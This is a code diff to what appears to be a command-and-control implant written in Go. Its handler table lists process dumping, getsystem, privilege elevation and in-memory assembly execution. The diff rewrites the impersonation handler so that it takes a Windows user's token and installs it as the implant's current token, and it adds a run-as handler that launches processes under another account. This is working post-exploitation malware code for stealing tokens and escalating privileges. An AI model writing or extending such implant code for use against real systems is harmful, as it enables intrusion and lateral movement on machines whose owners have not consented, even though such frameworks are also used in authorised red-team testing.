@@ -37,6 +37,7 @@ var (
 		pb.MsgRemoteTask:         remoteTaskHandler,
 		pb.MsgProcessDumpReq:     dumpHandler,
 		pb.MsgImpersonateReq:     impersonateHandler,
+		pb.MsgRunAs:     		  runAsHandler,
 		pb.MsgGetSystemReq:       getsystemHandler,
 		pb.MsgElevateReq:         elevateHandler,
 		pb.MsgExecuteAssemblyReq: executeAssemblyHandler,
@@ -66,6 +67,7 @@ func GetSystemHandlers() map[uint32]RPCHandler {
 // ---------------- Windows Handlers ----------------
 
 func impersonateHandler(data []byte, resp RPCResponse) {
+	var errStr string
 	impersonateReq := &pb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
 	if err != nil {
@@ -74,15 +76,37 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	out, err := priv.RunProcessAsUser(impersonateReq.Username, impersonateReq.Process, impersonateReq.Args)
+	token, err := priv.Impersonate(impersonateReq.Username)
+	if err != nil {
+		errStr = err.Error()
+	} else {
+		taskrunner.CurrentToken = token
+	}
+	impersonate := &pb.Impersonate{
+		Err: errStr,
+	}
+	data, err = proto.Marshal(impersonate)
+	resp(data, err)
+}
+
+func runAsHandler(data []byte, resp RPCResponse) {
+	runAsReq := &pb.RunAsReq{}
+	err := proto.Unmarshal(data, runAsReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	out, err := priv.RunProcessAsUser(runAsReq.Username, runAsReq.Process, runAsReq.Args)
 	if err != nil {
 		resp([]byte{}, err)
 		return
 	}
-	impersonate := &pb.Impersonate{
+	runAs := &pb.RunAs{
 		Output: out,
 	}
-	data, err = proto.Marshal(impersonate)
+	data, err = proto.Marshal(runAs)
 	resp(data, err)
 }
 
